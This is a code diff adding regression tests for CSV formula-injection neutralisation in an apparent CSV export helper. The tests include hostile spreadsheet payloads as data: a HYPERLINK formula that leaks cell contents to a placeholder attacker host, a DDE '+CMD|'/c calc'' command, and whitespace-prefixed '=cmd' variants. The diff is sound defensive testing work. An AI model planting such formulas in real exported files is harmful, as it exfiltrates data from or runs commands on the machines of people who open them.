@@ -42,6 +42,65 @@ describe("ExportCSVButton helpers", () => {
     it("quotes values containing carriage returns alone", () => {
       expect(escapeCell("foo\rbar")).toBe('"foo\rbar"');
     });
+
+    // CSV-injection (a.k.a. formula-injection) regression coverage.
+    // The exported CSV is opened in Excel/LibreOffice/Google Sheets,
+    // all of which evaluate a cell beginning with =, +, -, @, tab,
+    // or carriage return as a formula. Stored text (KPI notes,
+    // breakdown labels) must be neutralized so a writer cannot plant
+    // a payload that runs on a staff member's machine.
+    it("prefixes formula-leading strings with a single quote", () => {
+      // +SUM(1,1) contains a comma so the whole cell is also quoted
+      // per RFC-4180; the single-quote prefix sits inside the quotes.
+      // The other payloads have no comma/quote/CR/LF so they pass
+      // through unquoted, just with the prefix.
+      expect(escapeCell("=HYPERLINK(\"https://evil/\",\"x\")")).toBe(
+        "\"'=HYPERLINK(\"\"https://evil/\"\",\"\"x\"\")\"",
+      );
+      expect(escapeCell("+SUM(1,1)")).toBe("\"'+SUM(1,1)\"");
+      expect(escapeCell("-2+3")).toBe("'-2+3");
+      expect(escapeCell("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
+      expect(escapeCell("\tinjected tab")).toBe("'\tinjected tab");
+      // CR is a CSV delimiter so this one is also quoted.
+      expect(escapeCell("\rinjected CR")).toBe("\"'\rinjected CR\"");
+    });
+
+    it("neutralizes formula prefixes that follow leading whitespace", () => {
+      // Some spreadsheets strip leading whitespace before the formula
+      // check, so a payload of "  =cmd|..." would otherwise slip past
+      // a prefix check that only looks at the first character.
+      expect(escapeCell("   =HYPERLINK(...)")).toBe("'   =HYPERLINK(...)");
+      expect(escapeCell("\t=HYPERLINK(...)")).toBe("'\t=HYPERLINK(...)");
+    });
+
+    it("leaves numeric values that happen to start with a minus unchanged", () => {
+      // -3.14 as a number is the standard CSV representation of a
+      // negative number, not a formula. The neutralization rule only
+      // applies to text that was *stored* with a formula-leading char.
+      expect(escapeCell(-3.14)).toBe("-3.14");
+      expect(escapeCell(-100)).toBe("-100");
+      expect(escapeCell(0)).toBe("0");
+    });
+
+    it("leaves plain strings that do not start with a formula trigger unchanged", () => {
+      expect(escapeCell("hello")).toBe("hello");
+      expect(escapeCell("123")).toBe("123");
+      expect(escapeCell("1.5x growth")).toBe("1.5x growth");
+      // A string that does start with = is still neutralized, but a
+      // string where = appears later in the value is not.
+      expect(escapeCell("=foo bar")).toBe("'=foo bar");
+      expect(escapeCell("a = b")).toBe("a = b");
+    });
+
+    it("neutralizes and then quotes when both rules apply", () => {
+      // A formula-leading string that also contains a delimiter must
+      // be both neutralized (so it isn't evaluated) and quoted (so
+      // the comma survives the round-trip). The single quote is
+      // preserved inside the outer quotes.
+      expect(escapeCell("=HYPERLINK(\"a,b\")")).toBe(
+        "\"'=HYPERLINK(\"\"a,b\"\")\"",
+      );
+    });
   });
 
   describe("inferColumns", () => {
@@ -105,7 +164,87 @@ describe("ExportCSVButton helpers", () => {
       const csv = buildCSV([{ a: 1, b: 2, c: 3 }], ["c", "a", "b"]);
       expect(csv).toBe("c,a,b\r\n3,1,2\r\n");
     });
+
+    it("neutralizes formula-injection payloads in stored KPI text (buildCSV integration)", () => {
+      // End-to-end: a row whose notes/labels contain formula-leading
+      // strings, as a writer could store in the DB, must come out of
+      // buildCSV() with a leading single quote so the resulting CSV
+      // does not evaluate as a formula when a staff member opens it
+      // in a spreadsheet. This is the exact reviewer repro shape.
+      const csv = buildCSV(
+        [
+          {
+            kpi: "video-views",
+            notes: '=HYPERLINK("https://attacker/?x="&A1,"click")',
+            label: "+CMD|'/c calc'!A1",
+          },
+          { kpi: "webpage-views", notes: "all good", label: "  =cmd" },
+        ],
+        ["kpi", "notes", "label"],
+      );
+      // No cell in the output should begin with a formula trigger
+      // (other than the leading "='...", "+='...", etc. neutralization).
+      // The neutralization is the single-quote prefix that the
+      // spreadsheet will hide on display.
+      expect(csv).toContain("\"'=HYPERLINK(\"\"https://attacker/?x=\"\"&A1,\"\"click\"\")\"");
+      // +CMD|'/c calc'!A1 has no comma/quote/CR/LF, so it is not
+      // delimiter-quoted; just neutralized with the leading single
+      // quote.
+      expect(csv).toContain(",'+CMD|'/c calc'!A1");
+      expect(csv).toContain("'  =cmd");
+      // And critically, no raw formula prefix should remain in the
+      // output without its single-quote shield.
+      const lines = csv.split("\r\n");
+      const dataLines = lines.slice(1).filter((l) => l.length > 0);
+      for (const line of dataLines) {
+        // Each cell, after delimiter-quote stripping, must NOT begin
+        // with =, +, -, @, tab, or carriage return (the first cell
+        // is the kpi name, which is "video-views" or "webpage-views",
+        // so this is a coarse check that the helpers are working).
+        const cells = parseCsvLine(line);
+        for (const cell of cells) {
+          expect(cell).not.toMatch(/^[=+\-@\t\r]/);
+        }
+      }
+    });
   });
+
+  /**
+   * Minimal RFC-4180 line parser for the assertion above. Splits on
+   * commas that are not inside a quoted region, and un-escapes the
+   * doubled "" inside a quoted region. Handles neither escaped
+   * newlines nor escaped quotes inside cells; sufficient for the
+   * test rows that don't contain embedded CR/LF.
+   */
+  function parseCsvLine(line: string): string[] {
+    const out: string[] = [];
+    let cur = "";
+    let inQuotes = false;
+    for (let i = 0; i < line.length; i++) {
+      const ch = line[i];
+      if (inQuotes) {
+        if (ch === '"' && line[i + 1] === '"') {
+          cur += '"';
+          i++;
+        } else if (ch === '"') {
+          inQuotes = false;
+        } else {
+          cur += ch;
+        }
+      } else {
+        if (ch === ",") {
+          out.push(cur);
+          cur = "";
+        } else if (ch === '"' && cur === "") {
+          inQuotes = true;
+        } else {
+          cur += ch;
+        }
+      }
+    }
+    out.push(cur);
+    return out;
+  }
 
   describe("ensureCsvExt", () => {
     it("appends .csv when missing", () => {
